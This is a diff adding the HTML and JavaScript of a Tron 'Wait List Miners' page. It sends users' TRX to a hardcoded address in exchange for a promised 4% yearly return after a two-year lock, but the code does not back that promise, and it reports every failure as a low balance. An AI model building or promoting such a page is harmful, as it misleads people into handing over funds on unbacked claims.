@@ -1,0 +1,262 @@
+<html>
+<head>
+    <title>Miners</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --primary: #FF4B1F;
+            --dark: #1F2937;
+            --light: #F3F4F6;
+            --background: #111827;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--background);
+            color: var(--light);
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: var(--dark);
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .wallet-info {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .button {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .button:hover {
+            opacity: 0.9;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            padding: 10px 20px;
+            background: var(--dark);
+            border: none;
+            color: var(--light);
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .tab.active {
+            background: var(--primary);
+        }
+
+        .miners-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .miner-card {
+            background: var(--dark);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .console {
+            background: var(--dark);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-family: monospace;
+            height: 200px;
+            overflow-y: auto;
+        }
+
+        @media (max-width: 768px) {
+            .wallet-info {
+                flex-direction: column;
+            }
+            
+            .tabs {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Wait List Miners</h1>
+            <div class="wallet-info">
+                <span id="wallet-address">Not connected</span>
+                <span id="wallet-balance">Balance: 0 TRX</span>
+                <button id="connect-wallet" class="button">Connect Wallet</button>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" data-tab="home">Home</button>
+            <button class="tab" data-tab="miners">Miners</button>
+            <button class="tab" data-tab="swap">Lend/Borrow Tokens</button>
+        </div>
+
+        <div class="tab-content" id="home-content">
+            <h2>Welcome to Wait List Miners</h2>
+            <p>Connect your wallet to start mining tokens on the Tron network.</p>
+            <div class="quick-actions">
+                <button class="button" onclick="window.open('https://www.tronlink.org', '_blank')">Get TronLink</button>
+                <button class="button" onclick="window.open('https://sun.io', '_blank')">Visit Sun.io</button>
+                <button class="button" onclick="window.open('https://tronscan.org', '_blank')">Tronscan</button>
+                <button class="button" onclick="window.open('https://tronscan.org/#/token20/TXmP9gBMhyLv3T1AMBBDVU16DNF7keuWbm', '_blank')">UTRC20</button>
+                <button class="button" onclick="window.open('https://youtube.com/@waitlistminers?si=wIv9DwbRcGLq7tAZ', '_blank')">YOUTUBE</button>
+                <button class="button" onclick="window.open('https://traffmonetizer.com/?aff=778453', '_blank')">Bandwidth Miners</button>
+                <button class="button" onclick="window.open('https://www.publish0x.com/start/investing-is-waiting-securely-xxvxkky?a=oQeZYYYRdp')">Earn while blogging</button>
+
+            </div>
+        </div>
+
+        <div class="tab-content" id="miners-content" style="display: none;">
+            <div class="miners-grid">
+                <div class="miner-card">
+
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/_BiF39uap9Q?si=DKXkxsqb5QCNPR2v" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+
+
+                    <h3>Basic Miner</h3>
+                    <p> 2 years locked contract</p>
+                    <p> Return: 4% APY</p>
+                    <label for="miner-price">Enter Price (TRX):</label>
+                    <input type="number" id="miner-price" placeholder="Price > 1 TRX" min="1" step="1">
+                    <button class="button" onclick="purchaseMiner('basic')">Purchase</button>
+                </div>
+                <!-- Additional miner cards can be added here -->
+            </div>
+        </div>
+
+        <div class="tab-content" id="swap-content" style="display: none;">
+            <h2>Swap & Lending</h2>
+            <p>Access DeFi services on the Tron network.</p>
+            <button class="button" onclick="window.open('https://justlend.org', '_blank')">Visit JustLend</button>
+        </div>
+
+        <div class="console" id="console-output"></div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+    <script>
+        let tronWeb;
+        const paymentAddress = "TByA948j7t1fZfHoEZ3WybMwW7KKDEzcFb"; // Payment address for transaction
+
+        async function connectWallet() {
+            try {
+                if (window.tronLink) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    tronWeb = window.tronWeb;
+                    const address = tronWeb.defaultAddress.base58;
+                    document.getElementById('wallet-address').textContent = 
+                        `${address.substr(0, 6)}...${address.substr(-4)}`;
+                    updateBalance();
+                    logToConsole('Wallet connected successfully');
+                } else {
+                    logToConsole('Please install TronLink');
+                }
+            } catch (error) {
+                logToConsole('Error connecting wallet: ' + 'login first your tronlink then retry');
+            }
+        }
+
+        async function updateBalance() {
+            try {
+                const balance = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
+                document.getElementById('wallet-balance').textContent = 
+                    `Balance: ${balance / 1000000} TRX`;
+            } catch (error) {
+                logToConsole('Error updating balance: ' + error.message);
+            }
+        }
+
+        async function purchaseMiner(type) {
+            try {
+                if (!tronWeb) {
+                    throw new Error('Please connect wallet first');
+                }
+
+                // Get price from input
+                const priceInput = document.getElementById('miner-price').value;
+                const price = parseFloat(priceInput);
+
+                // Validate the price input (must be greater than 1 TRX)
+                if (price < 1 || isNaN(price)) {
+                    logToConsole('Price must be greater than 1 TRX');
+                    return;
+                }
+
+                // Send the price in TRX to the payment address
+                const transaction = await tronWeb.transactionBuilder.sendTrx(paymentAddress, price * 1000000, tronWeb.defaultAddress.base58); // Convert to Sun (1 TRX = 1,000,000 Sun)
+                const signedTransaction = await tronWeb.trx.sign(transaction);
+                const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+                
+                if (broadcastResult.result) {
+                    logToConsole(`Successfully purchased ${type} miner for ${price} TRX`);
+                    logToConsole(`Your miner funds will be available for release two years from the timestamp of this transaction, with UTRC20 tokens used as collateral.`);
+                } else {
+                    logToConsole(`Failed to purchase ${type} miner`);
+                }
+            } catch (error) {
+                logToConsole('Error purchasing miner: ' + 'your trx balance is to low: choose a smaller mining plan');
+            }
+        }
+
+        function logToConsole(message) {
+            const console = document.getElementById('console-output');
+            const timestamp = new Date().toLocaleTimeString();
+            console.innerHTML += `[${timestamp}] ${message}<br>`;
+            console.scrollTop = console.scrollHeight;
+        }
+
+        // Tab switching logic
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                const tabId = tab.getAttribute('data-tab');
+                document.querySelectorAll('.tab-content').forEach(content => {
+                    content.style.display = 'none';
+                });
+                document.getElementById(`${tabId}-content`).style.display = 'block';
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+            });
+        });
+
+        // Initial setup
+        document.getElementById('connect-wallet').addEventListener('click', connectWallet);
+        logToConsole('Platform initialized: You will be rewarded in utrc20 tokens for your mining');
+    </script>
+</body>
+</html>
